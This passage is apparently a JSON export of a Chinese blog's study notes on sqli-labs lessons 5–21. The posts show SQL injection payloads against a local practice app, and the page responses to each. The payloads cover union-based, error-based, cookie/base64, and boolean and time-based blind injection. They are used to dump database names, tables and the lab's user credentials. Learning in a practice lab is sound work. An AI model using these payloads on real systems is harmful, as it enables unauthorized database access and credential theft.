5#</code></td>\n<td>语法错误</td>\n</tr>\n<tr>\n<td><code>Dumb&#39; order by 1#</code></td>\n<td>正常</td>\n</tr>\n<tr>\n<td><code>Dumb&#39; order by 3#</code></td>\n<td>正常</td>\n</tr>\n<tr>\n<td><code>Dumb&#39; order by 4#</code></td>\n<td>语法错误</td>\n</tr>\n</tbody>\n</table>\n<font color=\"red\">说明sql语句有三个字段</font>\n\n<h2 id=\"1-2-获取数据库信息\"><a href=\"#1-2-获取数据库信息\" class=\"headerlink\" title=\"1.2 获取数据库信息\"></a>1.2 获取数据库信息</h2><p>cookie 值：<code>&#39; union select version(),database(),user()#</code><br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7fl5zdbnkj310n0a2gqm.jpg\" alt=\"\"><br>页面显示</p>\n<ul>\n<li>数据库版本：5.6.17</li>\n<li>数据库名：security</li>\n<li>用户名：root@localhost</li>\n</ul>\n<p>其他数据库信息的获取方式，参加 <a href=\"http://huirong.github.io/2016/08/24/sqli-labs-series-lesson1-4/\">sqli labs lesson 1~4 学习</a> lesson 1</p>\n<h1 id=\"2-lesson-21-cookie注入-基于错误\"><a href=\"#2-lesson-21-cookie注入-基于错误\" class=\"headerlink\" title=\"2 lesson 21 cookie注入-基于错误\"></a>2 lesson 21 cookie注入-基于错误</h1><h2 id=\"2-1-测试\"><a href=\"#2-1-测试\" class=\"headerlink\" title=\"2.1 测试\"></a>2.1 测试</h2><ul>\n<li>在页面输入 用户名：Dumb 密码：Dumb 后</li>\n<li>cookie 值：RHVtYg==</li>\n<li>备注：可能是浏览器上看到的 cookie 值为：RHVtYg%3D%3D，因为 == 浏览器进行url编码后为 %3D</li>\n</ul>\n<p>无论怎么使用 lesson 20 的方式修改cookie都没有用<br>使用 base 64 解密 cookie<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7ii7z0ugzj30eq099dgi.jpg\" alt=\"\"><br>解密后的结果为 Dumb，说明cookie是经过base 64加密的。</p>\n<h2 id=\"2-2-闭合类型\"><a href=\"#2-2-闭合类型\" class=\"headerlink\" title=\"2.2 闭合类型\"></a>2.2 闭合类型</h2><p>将 <code>Dumb\\</code> 进行base64加密<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7iie2bw5uj30eq09zgmc.jpg\" alt=\"\"></p>\n<p>然后EditThisCookie，将cookie修改为加密后的值<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7iiepfhe8j30fm0cgwg4.jpg\" alt=\"\"></p>\n<p>刷新页面<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7iifome6uj311p08sgqk.jpg\" alt=\"\"></p>\n<p>页面出现如下错误：<br><code>Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;Dumb\\&#39;) LIMIT 0,1&#39; at line 1</code></p>\n<p>说明 sql 语句是以 <code>(&#39;&#39;)</code> 闭合的。</p>\n<h2 id=\"2-2-注入\"><a href=\"#2-2-注入\" class=\"headerlink\" title=\"2.2 注入\"></a>2.2 注入</h2><p>将 <code>&#39;) union select database(),version(),version() #</code>  进行base64加密<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7iij6a57wj30eq094t9s.jpg\" alt=\"\"></p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7iijffkzmj30fm0cg0ul.jpg\" alt=\"\"></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7iijuq7ntj31160bkwk1.jpg\" alt=\"\"></p>\n<p>页面上显示出数据库，MySQL版本等信息。<br>其他数据库信息的获取方式，参加 <a href=\"http://huirong.github.io/2016/08/24/sqli-labs-series-lesson1-4/\">sqli labs lesson 1~4 学习</a> lesson 1</p>\n<h1 id=\"3-后记\"><a href=\"#3-后记\" class=\"headerlink\" title=\"3 后记\"></a>3 后记</h1><p>sqli labs 的学习就先告一段落，等找完工作，继续学习，顺便把中间没有博客的 lesson 18 和 lesson 19 补上。</p>\n"},{"title":"sqli labs lesson 11~17 学习","url":"http://huirong.github.io/2016/08/26/sqli-labs-series-lesson11-17/","content":"<p>lesson 11~16的 SQL Injection 原理和lesson 1~10一样，只是lesson 11~16 是通过post传参，即在页面文本框中输入数据，而lesson 1~10是URL中传参。<br><a id=\"more\"></a></p>\n<h1 id=\"1-lesson-11-POST-基于错误-单引号\"><a href=\"#1-lesson-11-POST-基于错误-单引号\" class=\"headerlink\" title=\"1 lesson 11 POST-基于错误-单引号\"></a>1 lesson 11 POST-基于错误-单引号</h1><p>在输入框输入 admin 和 password，页面显示 <code>LOGIN ATTEMPT FAILED</code><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f77hdibrafj30k00cimz4.jpg\" alt=\"\"></p>\n<h2 id=\"1-1-判断注入类型\"><a href=\"#1-1-判断注入类型\" class=\"headerlink\" title=\"1.1 判断注入类型\"></a>1.1 判断注入类型</h2><table>\n<thead>\n<tr>\n<th>输入</th>\n<th>结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>admin password</code></td>\n<td>页面显示 <code>LOGIN ATTEMPT FAILED</code></td>\n</tr>\n<tr>\n<td><code>admin password&quot;</code></td>\n<td>页面显示 <code>LOGIN ATTEMPT FAILED</code></td>\n</tr>\n<tr>\n<td><code>admin password&#39;</code></td>\n<td>页面显示语法错误</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f77hmjpaa7j311t07twfw.jpg\" alt=\"\"><br>“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’password’’ LIMIT 0,1’ at line 1”</p>\n<p>说明是基于错误的、单引号注入</p>\n<p>sql 语句 ：<code>select * from tables where username=&#39;$username&#39; and password=&#39;$password&#39; limit 0,1</code></p>\n<h2 id=\"1-2-验证注入类型\"><a href=\"#1-2-验证注入类型\" class=\"headerlink\" title=\"1.2 验证注入类型\"></a>1.2 验证注入类型</h2><ul>\n<li>参数 $username=<code>admin&#39; and 1=1#</code>   $password 为空</li>\n<li>sql 语句  <code>select * from tables where username=&#39;admin&#39; and 1=1#&#39; and password=&#39;&#39; limit 0,1</code></li>\n</ul>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f77hwezjw1j30k00f2mzb.jpg\" alt=\"\"></p>\n<p>账号：admin   密码：admin<br>SUCCESSFULLY LOGGED IN</p>\n<h2 id=\"1-3-order-by-判断字段个数\"><a href=\"#1-3-order-by-判断字段个数\" class=\"headerlink\" title=\"1.3 order by 判断字段个数\"></a>1.3 order by 判断字段个数</h2><table>\n<thead>\n<tr>\n<th>username</th>\n<th>结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>admin’ and 1=1 order by 1#</td>\n<td>SUCCESSFULLY LOGGED IN</td>\n</tr>\n<tr>\n<td>admin’ and 1=1 order by 5#</td>\n<td>Unknown column ‘5’ in ‘order clause’  &amp;  LOGIN ATTEMPT FAILED</td>\n</tr>\n<tr>\n<td>admin’ and 1=1 order by 3#</td>\n<td>Unknown column ‘3’ in ‘order clause’  &amp;  LOGIN ATTEMPT FAILED</td>\n</tr>\n<tr>\n<td>admin’ and 1=1 order by 2#</td>\n<td>SUCCESSFULLY LOGGED IN</td>\n</tr>\n</tbody>\n</table>\n<p>从数据库中 <font color=\"red\">选取了 2 个字段</font><br>sql 语句：<code>select col1,col2 from tables where username=&#39;$username&#39; and password=&#39;$password&#39; limit 0,1</code></p>\n<h2 id=\"1-4-利用-information-schema-获得信息\"><a href=\"#1-4-利用-information-schema-获得信息\" class=\"headerlink\" title=\"1.4 利用 information_schema 获得信息\"></a>1.4 利用 information_schema 获得信息</h2><h3 id=\"1-4-1-union-获得数据库和版本\"><a href=\"#1-4-1-union-获得数据库和版本\" class=\"headerlink\" title=\"1.4.1 union 获得数据库和版本\"></a>1.4.1 union 获得数据库和版本</h3><p>username：  <code>&#39; union select 1,2#</code><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f79b3e50bhj30fa09qjrz.jpg\" alt=\"\"><br>1,2 可以在页面上显示</p>\n<p>username ： <code>&#39; union select database(),version()#</code><br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f79b42mszyj30fa09st9f.jpg\" alt=\"\"><br>数据库：security<br>版本：5.6.17</p>\n<h3 id=\"1-4-2-表名\"><a href=\"#1-4-2-表名\" class=\"headerlink\" title=\"1.4.2 表名\"></a>1.4.2 表名</h3><p>username： <code>&#39; union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=database()#</code><br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f79b4vbkc2j30fa09qjs4.jpg\" alt=\"\"><br>表：emails,referers,uagents,users</p>\n<h3 id=\"1-4-3-字段名\"><a href=\"#1-4-3-字段名\" class=\"headerlink\" title=\"1.4.3 字段名\"></a>1.4.3 字段名</h3><p>username： <code>&#39; union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema=database()#</code><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f79b7ei1aej30h80a0ab0.jpg\" alt=\"\"><br>字段名：id,email_id,referer,ip_address,uagent,username,password</p>\n<h3 id=\"1-4-4-账号和密码\"><a href=\"#1-4-4-账号和密码\" class=\"headerlink\" title=\"1.4.4 账号和密码\"></a>1.4.4 账号和密码</h3><p>username： <code>&#39; union select group_concat(username),group_concat(password) from users#</code><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f79bb7r92nj30p70acq4e.jpg\" alt=\"\"></p>\n<table>\n<thead>\n<tr>\n<th>username</th>\n<th>password</th>\n<th>username</th>\n<th>password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Dumb</td>\n<td>Dumb</td>\n<td>Angelina</td>\n<td>I-kill-you</td>\n</tr>\n<tr>\n<td>Dummy</td>\n<td>p@ssword</td>\n<td>secure</td>\n<td>crappy</td>\n</tr>\n<tr>\n<td>stupid</td>\n<td>stupidity</td>\n<td>superman</td>\n<td>genious</td>\n</tr>\n<tr>\n<td>batman</td>\n<td>mob!le</td>\n<td>admin</td>\n<td>admin</td>\n</tr>\n<tr>\n<td>admin1</td>\n<td>admin1</td>\n<td>admin2</td>\n<td>admin2</td>\n</tr>\n<tr>\n<td>admin3</td>\n<td>admin3</td>\n<td>dhakkan</td>\n<td>dumbo</td>\n</tr>\n<tr>\n<td>admin4</td>\n<td>admin4</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"2-lesson-12-POST-基于错误-双引号-一个括号\"><a href=\"#2-lesson-12-POST-基于错误-双引号-一个括号\" class=\"headerlink\" title=\"2 lesson 12 POST-基于错误-双引号-一个括号\"></a>2 lesson 12 POST-基于错误-双引号-一个括号</h1><h2 id=\"2-1-判断注入类型\"><a href=\"#2-1-判断注入类型\" class=\"headerlink\" title=\"2.1 判断注入类型\"></a>2.1 判断注入类型</h2><table>\n<thead>\n<tr>\n<th>输入</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>admin ‘</td>\n<td>页面显示 <code>LOGIN ATTEMPT FAILED</code></td>\n</tr>\n<tr>\n<td>admin “</td>\n<td>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“admin “”) and password=(“”) LIMIT 0,1’ at line 1</td>\n</tr>\n<tr>\n<td>admin “)#</td>\n<td>SUCCESSFULLY LOGGED IN</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f79bqwm64dj30k00emtax.jpg\" alt=\"\"></p>\n<font color=\"red\"> 说明是双引号闭合，且有括号</font>\n\n<p>其他获取数据库信息的步骤同 lesson 11</p>\n<h1 id=\"3-lesson-13-POST-基于错误-二次注入-单引号-一个括号\"><a href=\"#3-lesson-13-POST-基于错误-二次注入-单引号-一个括号\" class=\"headerlink\" title=\"3 lesson 13 POST-基于错误-二次注入-单引号-一个括号\"></a>3 lesson 13 POST-基于错误-二次注入-单引号-一个括号</h1><p>注入原理请参见：<a href=\"http://huirong.github.io/2016/08/25/sqli-labs-series-lesson5-7/\">sqli labs lesson 5~7 学习</a></p>\n<h2 id=\"3-1-判断注入类型\"><a href=\"#3-1-判断注入类型\" class=\"headerlink\" title=\"3.1 判断注入类型\"></a>3.1 判断注入类型</h2><table>\n<thead>\n<tr>\n<th>输入</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>admin ‘</td>\n<td>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’admin ‘’) and password=(‘’) LIMIT 0,1’ at line 1</td>\n</tr>\n<tr>\n<td>admin’)#</td>\n<td>SUCCESSFULLY LOGGED IN</td>\n</tr>\n</tbody>\n</table>\n<p> 说明是单引号闭合，且有括号</p>\n<h2 id=\"3-2-构造编译正确，运行可能出错的sql\"><a href=\"#3-2-构造编译正确，运行可能出错的sql\" class=\"headerlink\" title=\"3.2 构造编译正确，运行可能出错的sql\"></a>3.2 构造编译正确，运行可能出错的sql</h2><p>sql： <code>select count(*),concat(database(),0x40,floor(rand()*2))a from information_schema.tables where table_schema=database() group by a</code><br>username：’) union select count(<em>),concat(database(),0x40,floor(rand()</em>2))a from information_schema.tables where table_schema=database() group by a#</p>\n<p>相同的输入，多次提交<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f79de281uuj30fa082dgc.jpg\" alt=\"\"></p>\n<p>错误：Duplicate entry ‘security@1’ for key ‘group_key’<br>说明数据库名字：security<br>同样的方法获取其他数据库信息</p>\n<h1 id=\"4-lesson-14-POST-基于错误-二次注入-单双引号\"><a href=\"#4-lesson-14-POST-基于错误-二次注入-单双引号\" class=\"headerlink\" title=\"4 lesson 14 POST-基于错误-二次注入-单双引号\"></a>4 lesson 14 POST-基于错误-二次注入-单双引号</h1><p>username：<code>&quot; union select count(*),concat(database(),0x40,floor(rand()*2))a from information_schema.tables where table_schema=database() group by a#</code></p>\n<p>除了闭合方式是双引号，其他注入过程同 lesson 13</p>\n<h1 id=\"5-lesson-15-POST-盲注-基于bool型\"><a href=\"#5-lesson-15-POST-盲注-基于bool型\" class=\"headerlink\" title=\"5 lesson 15 POST 盲注-基于bool型\"></a>5 lesson 15 POST 盲注-基于bool型</h1><p>思路同 <a href=\"sqli labs lesson 8~10 学习\">sqli labs lesson 8~10 学习</a> lesson 8 盲注-基于bool值</p>\n<h1 id=\"6-lesson-16-POST-盲注-基于时间\"><a href=\"#6-lesson-16-POST-盲注-基于时间\" class=\"headerlink\" title=\"6 lesson 16 POST 盲注-基于时间\"></a>6 lesson 16 POST 盲注-基于时间</h1><p>思路同 <a href=\"sqli labs lesson 8~10 学习\">sqli labs lesson 8~10 学习</a> lesson 9 盲注-基于时间-单引号</p>\n<h1 id=\"7-lesson-17-POST-UPDATE-基于错误\"><a href=\"#7-lesson-17-POST-UPDATE-基于错误\" class=\"headerlink\" title=\"7 lesson 17 POST-UPDATE-基于错误\"></a>7 lesson 17 POST-UPDATE-基于错误</h1><p>在文本框输入用户名和密码，显示“ SUCCESSFULLY UPDATED YOUR PASSWORD”，更新密码成功！！！</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1f7d1oyjo66j30jq0eqdix.jpg\" alt=\"\"></p>\n<h2 id=\"1-1-判断注入类型-1\"><a href=\"#1-1-判断注入类型-1\" class=\"headerlink\" title=\"1.1 判断注入类型\"></a>1.1 判断注入类型</h2><table>\n<thead>\n<tr>\n<th>username</th>\n<th>new password</th>\n<th>结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>admin</td>\n<td>12345</td>\n<td>SUCCESSFULLY UPDATED YOUR PASSWORD（密码更新成功）</td>\n</tr>\n<tr>\n<td>admin’</td>\n<td>123</td>\n<td>BUG OFF YOU SILLY DUMB HACKER</td>\n</tr>\n<tr>\n<td>admin</td>\n<td>‘</td>\n<td>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’ at line 1（语法错误）</td>\n</tr>\n<tr>\n<td>admin</td>\n<td>‘)</td>\n<td>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘)’ WHERE username=’admin’’ at line 1</td>\n<td></td>\n</tr>\n<tr>\n<td>admin</td>\n<td>“</td>\n<td>SUCCESSFULLY UPDATED YOUR PASSWORD</td>\n</tr>\n<tr>\n<td>admin</td>\n<td>“)</td>\n<td>SUCCESSFULLY UPDATED YOUR PASSWORD</td>\n</tr>\n</tbody>\n</table>\n<font color=\"red\"><br>参数是用 单引号’ 闭合的<br>sql语句：<code>update tables set password=&#39;$NewPassword&#39; where username=&#39;$username&#39; limit 0,1</code><br></font>\n\n<h2 id=\"1-2-获取数据库信息\"><a href=\"#1-2-获取数据库信息\" class=\"headerlink\" title=\"1.2 获取数据库信息\"></a>1.2 获取数据库信息</h2><font color=\"red\">注意，下面的注入，一不小心可能把数据库的user表的密码表给清空了</font>\n\n<p>编译正确，但运行可能出错的sql语句，如果不懂sql语句的构造过程，请参见<a href=\"http://huirong.github.io/2016/08/25/sqli-labs-series-lesson5-7/\">sqli labs lesson 5~7 学习</a>lesson 5<br><code>select count(*),(concat(&quot;~&quot;,database(),&quot;~&quot;,floor(rand()*2)))c from information_schema.tables group by c</code></p>\n<p>但是上诉sql语句查询结果有多列，因此需从中选取一列<br><code>select 1 from (select count(*),(concat(&quot;~&quot;,database(),&quot;~&quot;,floor(rand()*2)))c from information_schema.tables group by c)a</code></p>\n<ul>\n<li>username：<code>admin</code></li>\n<li>new password：<code>&#39; or (select 1 from (select count(*),(concat(&quot;~&quot;,database(),&quot;~&quot;,floor(rand()*2)))c from information_schema.tables group by c)a)#</code></li>\n</ul>\n<p>多次运行之后，可能出现如下错误：<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7ecqle3ivj30k00fgn0l.jpg\" alt=\"\"></p>\n<p>数据库名字会显示在页面上，以相同的方法获取数据库其他信息，具体过程，参见参见<a href=\"http://huirong.github.io/2016/08/25/sqli-labs-series-lesson5-7/\">sqli labs lesson 5~7 学习</a>lesson 5。</p>\n"},{"title":"sqli labs lesson 8~10 学习","url":"http://huirong.github.io/2016/08/26/sqli-labs-series-lesson8-10/","content":"<p>很多时候，Web服务器关闭了错误回显，攻击者为了应对这种情况，研究出了“盲注”（Blind Injection）的技巧。<br><a id=\"more\"></a></p>\n<h1 id=\"1-盲注\"><a href=\"#1-盲注\" class=\"headerlink\" title=\"1 盲注\"></a>1 盲注</h1><p><strong>盲注</strong> 就是在服务器没有错误回显的时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”，所以攻击者必要找到一个方法来验证注入的SQL语句是否得到执行。<br>最常见的盲注验证方法是，构造简单的条件语句，根据返回页面是否发生变化，来判断SQL语句是否执行。<br>比如，一个网站的 URL：<br><code>http://localhost/sqli-labs-master/Less-8/?id=1&#39;%23</code><br>执行的SQL语句<br><code>select * from tables where id = &#39;1&#39;%23&#39; limit 0,1</code><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f775iarqpdj30c803cwek.jpg\" alt=\"\"></p>\n<h2 id=\"1-1-测试-SQL-漏洞\"><a href=\"#1-1-测试-SQL-漏洞\" class=\"headerlink\" title=\"1.1 测试 SQL 漏洞\"></a>1.1 测试 SQL 漏洞</h2><p>如果构造如下条件语句：<br><code>http://localhost/sqli-labs-master/Less-8/?id=1&#39; and 1=0%23</code><br>实际执行的SQL语句：<br><code>select * from tables where id = &#39;1&#39; and 1=0%23&#39; limit 0,1</code><br>因为 “and 1=0” 为false，所以这条SQL语句的 “and” 条件永远无法成立。对Web应用来说，也不会将结果返回给用户，攻击者看到的页面结果将为空或者是一个出错的页面。<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f775iypxzdj30c803ca9z.jpg\" alt=\"\"></p>\n<h2 id=\"1-2-确认-SQL-漏洞\"><a href=\"#1-2-确认-SQL-漏洞\" class=\"headerlink\" title=\"1.2 确认 SQL 漏洞\"></a>1.2 确认 SQL 漏洞</h2><p>为了进一步确认注入是否存在，必须再次验证这个过程。因为一些处理逻辑或安全功能，在攻击者构造异常请求时，也可能会导致页面返回不正常。攻击者继续构造如下请求：<br><code>http://localhost/sqli-labs-master/Less-8/?id=1&#39; and 1=1%23</code><br>当攻击者构造条件 “and 1=1” 时，如果页面正常返回了，则说明 SQL 语句的 “and” 成功执行，那么久可以判断 “id” 参数存在 SQL 注入漏洞。<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f775jqhx1kj30c803c3ym.jpg\" alt=\"\"></p>\n<font color=\"red\">盲注工作原理：虽然服务器关闭了错误回显，但攻击者通过简单的条件判断，在对比页面返回结果的差异，就可以判断出 SQL 注入漏洞是否存在</font>\n\n<h1 id=\"2-lesson-8-盲注-基于bool值\"><a href=\"#2-lesson-8-盲注-基于bool值\" class=\"headerlink\" title=\"2 lesson 8 盲注-基于bool值\"></a>2 lesson 8 盲注-基于bool值</h1><h2 id=\"2-1-基础知识\"><a href=\"#2-1-基础知识\" class=\"headerlink\" title=\"2.1 基础知识\"></a>2.1 基础知识</h2><h3 id=\"2-1-1-substr\"><a href=\"#2-1-1-substr\" class=\"headerlink\" title=\"2.1.1 substr\"></a>2.1.1 substr</h3><p>SQL 中的 substring 函数是用来抓出一个栏位资料中的其中一部分。这个函数的名称在不同的资料库中不完全一样。</p>\n<ul>\n<li>MySQL: SUBSTR(), SUBSTRING()</li>\n<li>Oracle: SUBSTR()</li>\n<li>SQL Server: SUBSTRING()</li>\n</ul>\n<p>最常用到的方式如下 (在这里我们用 SUBSTR() 为例)：</p>\n<table>\n<thead>\n<tr>\n<th>原型</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>SUBSTR(str, pos)</td>\n<td>从 str 中，选出所有从第 pos 位置开始的字元。请注意，这个语法不适用于 SQL Server 上。</td>\n</tr>\n<tr>\n<td>SUBSTR(str, pos, len)</td>\n<td>从 str 中的第 pos 位置开始，选出接下去的 len 个字元。</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f775xbbk66j30c803jaao.jpg\" alt=\"\"></p>\n<p><code>SELECT substr(email_id,3) FROM</code>emails<code>WHERE id=1</code><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f775zhclgtj30c8067dg1.jpg\" alt=\"\"></p>\n<p><code>SELECT substr(email_id,0,3) FROM</code>emails<code>WHERE id=1</code><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7760qfdspj30c806oaaa.jpg\" alt=\"\"></p>\n<h3 id=\"2-1-1-assci\"><a href=\"#2-1-1-assci\" class=\"headerlink\" title=\"2.1.1 assci\"></a>2.1.1 assci</h3><p>ascii()函数将字符转换成其对应的ascii码，而char()函数将数字转换成对应的acscii码字符。</p>\n<h2 id=\"2-2-基于bool型盲注\"><a href=\"#2-2-基于bool型盲注\" class=\"headerlink\" title=\"2.2 基于bool型盲注\"></a>2.2 基于bool型盲注</h2><p>本篇第一小节可知，lesson 8 是单引号闭合的。</p>\n<table>\n<thead>\n<tr>\n<th>sql语句</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>select database()</td>\n<td>当前数据库</td>\n</tr>\n<tr>\n<td>select substr(database(),1,1)</td>\n<td>当前数据库名首字母</td>\n</tr>\n<tr>\n<td>select ascii(substr(database(),1,1))</td>\n<td>当前数据库名首字母 ascii 码值</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>?id=1’%23</td>\n<td>You are in…. 页面显示正确</td>\n</tr>\n<tr>\n<td>?id=1’ and 1=0%23</td>\n<td>页面显示出错</td>\n</tr>\n<tr>\n<td>?id=1’ and 1=1%23</td>\n<td>You are in…. 页面显示正确</td>\n</tr>\n<tr>\n<td>?id=1’ and (select ascii(substr(database(),1,1)))=97%23</td>\n<td>You are in…. 正确，说明首字母不为 a</td>\n</tr>\n<tr>\n<td>?id=1’ and (select ascii(substr(database(),1,1)))=115%23</td>\n<td>You are in…. 正确，说明首字母为 s</td>\n</tr>\n</tbody>\n</table>\n<p>依照相同的方法，猜解除所有数据库信息。</p>\n<h1 id=\"3-lesson-9-盲注-基于时间-单引号\"><a href=\"#3-lesson-9-盲注-基于时间-单引号\" class=\"headerlink\" title=\"3 lesson 9 盲注-基于时间-单引号\"></a>3 lesson 9 盲注-基于时间-单引号</h1><p>lesson 9 无论输入的参数是否合法，页面都没有任何差异。<br>在盲注（blind SQL injection）时，如果不同SQL injection 指令的结果，无法由 HTTP Response 本身得知，则可用时间差的方式判断。</p>\n<p><font color=\"red\">设计一个很耗时的 SQL 指令，如果 SQL injection 成功，那么这个SQL injection 指令的执行结果，会影响到 Web server 响应 HTTP response 的速度，由此判断 SQL injection 指令执行的结果。</font></p>\n<h2 id=\"3-1-sleep-和-BENCHMARK\"><a href=\"#3-1-sleep-和-BENCHMARK\" class=\"headerlink\" title=\"3.1 sleep() 和 BENCHMARK()\"></a>3.1 sleep() 和 BENCHMARK()</h2><ul>\n<li>sleep(N)函数，强制让语句停留N秒钟</li>\n<li>BENCHMARK(count,expr)函数，重复执行表达式expr count次，使得结果返回的时间比平时要长</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>?id=1 and if(1,sleep(60),null)%23</td>\n<td>页面无延迟</td>\n</tr>\n<tr>\n<td>?id=1’ and if(1,sleep(60),null)%23</td>\n<td>页面加载一段延迟后，正常显示</td>\n</tr>\n<tr>\n<td>?id=1” and if(1,sleep(60),null)%23</td>\n<td>页面无延迟</td>\n</tr>\n</tbody>\n</table>\n<p>说明参数时用单引号 ‘ 闭合的。<br>也可以使用 BENCHMARK(50000000,ENCODE(‘hello’,’goodbye’)) 替换sleep(60) </p>\n<h2 id=\"3-2-基于时间型盲注\"><a href=\"#3-2-基于时间型盲注\" class=\"headerlink\" title=\"3.2 基于时间型盲注\"></a>3.2 基于时间型盲注</h2><table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>select ascii(substr(database(),1,1))</td>\n<td>数据库名首字母ascii码值</td>\n</tr>\n<tr>\n<td>?id=1’ and if((select ascii(substr(database(),1,1)))=97,sleep(60),null)%23</td>\n<td>页面无延迟，说明首字母不为 a</td>\n</tr>\n<tr>\n<td>?id=1’ and if((select ascii(substr(database(),1,1)))=115,sleep(60),null)%23</td>\n<td>页面延迟一段时间后加载，说明首字母为 s</td>\n</tr>\n</tbody>\n</table>\n<p>依照相同的方法，猜解除所有数据库信息。</p>\n<h1 id=\"4-lesson-10-盲注-基于时间-双引号\"><a href=\"#4-lesson-10-盲注-基于时间-双引号\" class=\"headerlink\" title=\"4 lesson 10 盲注-基于时间-双引号\"></a>4 lesson 10 盲注-基于时间-双引号</h1><p>参数用双引号闭合，其他步骤同上。</p>\n<h1 id=\"5-参考文献\"><a href=\"#5-参考文献\" class=\"headerlink\" title=\"5 参考文献\"></a>5 参考文献</h1><p><a href=\"https://www.youtube.com/watch?v=u7Z7AIR6cMI&amp;index=16&amp;list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro\" target=\"_blank\" rel=\"external\">sqli-labs series part 8 (Blind injections - Boolean based)</a><br><a href=\"https://www.youtube.com/watch?v=gzU1YBu_838&amp;index=15&amp;list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro\" target=\"_blank\" rel=\"external\">sqli-labs series part 9 (Blind injections - Time based)</a></p>\n"},{"title":"sqli labs lesson 5~7 学习","url":"http://huirong.github.io/2016/08/25/sqli-labs-series-lesson5-7/","content":"<h1 id=\"1-lesson-5：基于错误-单引号二次注入\"><a href=\"#1-lesson-5：基于错误-单引号二次注入\" class=\"headerlink\" title=\"1 lesson 5：基于错误-单引号二次注入\"></a>1 lesson 5：基于错误-单引号二次注入</h1><h2 id=\"1-1-测试\"><a href=\"#1-1-测试\" class=\"headerlink\" title=\"1.1 测试\"></a>1.1 测试</h2><ul>\n<li>参数 $id = <code>1&#39;</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-5/?id=1%27</code></li>\n<li>错误 <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></li>\n<li>sql 语句 <code>select * from tables where id = &#39;$id&#39; limit 0,1</code> ,参数在单引号内</li>\n</ul>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7684wu1ogj3105034gmk.jpg\" alt=\"\"></p>\n<h2 id=\"1-2-union-查询\"><a href=\"#1-2-union-查询\" class=\"headerlink\" title=\"1.2 union 查询\"></a>1.2 union 查询</h2><ul>\n<li>参数 $id = <code>&#39; union select 1,2,3%23</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-5/?id=%27%20union%20select%201,2,3%23</code></li>\n<li>sql 语句：<code>select col1,col2,col3 from tables where id = &#39;&#39; union select 1,2,3%23&#39; limit 0,1</code></li>\n</ul>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f768d41k3hj30c903xmx8.jpg\" alt=\"\"><br>but…..   页面上并没有显示数据库结果的地方，即使通过 union 查询到了数据库表，字段信息，也无法显示在页面上。<br>因此，需要构造 <font 